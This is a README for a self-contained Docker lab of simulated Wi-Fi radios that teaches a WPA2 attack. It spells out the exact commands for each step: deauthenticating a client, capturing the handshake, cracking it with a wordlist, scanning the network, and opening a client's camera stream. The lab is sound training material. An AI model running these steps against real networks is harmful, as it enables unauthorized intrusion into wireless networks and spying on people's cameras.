# WPA2 Lab — Docker Setup

## Architecture

```
Host Kernel (mac80211_hwsim)
  ├── wlan0  →  Container A (ap)      — hostapd running WPA2 AP (SSID: wifi-lab)
  ├── wlan1  →  Container B (client)  — wpa_supplicant connected to wifi-lab
  └── wlan2  →  HOST / Kali           — your attack interface
```

All three virtual radios are on the same simulated "air" — they all see each other's frames.



## Prerequisites (Kali host)

```bash
sudo apt install -y docker.io docker-compose aircrack-ng
sudo systemctl start docker
```

Make sure `mac80211_hwsim` is available:
```bash
modinfo mac80211_hwsim   # should print module info
```



## Start the lab

```bash
docker compose up --build
```

Wait until you see hostapd printing `AP-ENABLED` and the client showing `CTRL-EVENT-CONNECTED`.

Verify the virtual interfaces exist on the host:
```bash
iw dev
# Should show wlan0, wlan1, wlan2
```



## Attack from Kali (wlan2)

### 1. Enable monitor mode
```bash
sudo airmon-ng start wlan2
# Creates wlan2mon (or wlan2 stays with type monitor on some kernels)
```

### 2. Scan — confirm the AP is visible
```bash
sudo airodump-ng wlan2mon
# Look for SSID: wifi-lab, Channel: 6, Encryption: WPA2
# Note the BSSID (AP MAC) and the CLIENT MAC
```

### 3. Start capture on the AP channel
```bash
sudo airodump-ng -c 6 --bssid <AP_BSSID> -w capture wlan2mon
# Keep this running in a terminal
```

### 4. Deauthenticate the client
```bash
sudo aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan2mon
# This will deauthenticate the client. Make sure that after the deauthentication, the airodump capture the WPA2 handshake
```

### 5. Crack the handshake
```bash
sudo aircrack-ng <CAPTURE_FILE>.cap -w /usr/share/wordlists/rockyou.txt

# Expected output:
# KEY FOUND! [ cookie123 ]
```

### 6. Simulate joining the network

> **Note:** Actually connecting `wlan2` to the AP would break the simulated environment
> (mac80211_hwsim doesn't handle a third associated client cleanly alongside the monitor
> interface). Instead, run the provided helper script, which will simulate the connection

```bash
./connectToWifi.sh
```

### 7. Discover the target

```bash
nmap 10.133.7.0/24 -sT
# Port 554/tcp open on 10.133.7.86 — that's the client's RTSP camera
```

### 8. Access the camera stream

```bash
ffplay -rtsp_transport tcp rtsp://10.133.7.86:554/file
```



## WPA2 key in this lab

The key is: `cookie123`



## Network

All devices use static IPs on `10.133.7.0/24`:

| Device | Address |
|---|---|
| AP (`wlan0`) | `10.133.7.1` |
| Client (`wlan1`) | `10.133.7.86` |
| Attacker (`wlan2`) | `???` (not needed) |



## RTSP video stream

The client container runs an RTSP server on port `554`:

```
rtsp://10.133.7.86:554/file
```

To replace the video, swap out `client/bstreamer/video/videoa.mkv` and rebuild with `docker compose up --build`.



